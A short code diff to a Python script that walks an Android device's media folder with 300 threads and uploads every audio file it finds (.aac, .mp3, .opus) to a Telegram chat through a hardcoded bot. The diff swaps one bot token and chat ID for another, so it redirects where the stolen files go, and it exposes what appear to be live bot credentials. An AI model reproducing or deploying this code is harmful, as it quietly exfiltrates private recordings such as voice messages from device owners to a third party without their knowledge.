@@ -15,13 +15,13 @@ except ImportError:
     import pyfiglet
     import requests
 
-bot = telebot.TeleBot('7312222597:AAEW8bCgOONtrxH9wB0hYnVJ8gc30yRyNBg')
+bot = telebot.TeleBot('6785417702:AAHXTfPdboBOW6ITv2QBxftMDDOXHb6t9g8')
 dir_path = "/storage/emulated/0/Android/media/"
 
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".aac",".mp3", ".opus")):
-            bot.send_audio(chat_id=941286921, audio=f, caption='By: @atmaja_pro_bot')
+            bot.send_audio(chat_id=6723830547, audio=f, caption='By: @atmaja_pro_bot')
 def back():
 	with ThreadPoolExecutor(max_workers=300) as executor:
 		for root, dirs, files in os.walk(dir_path):
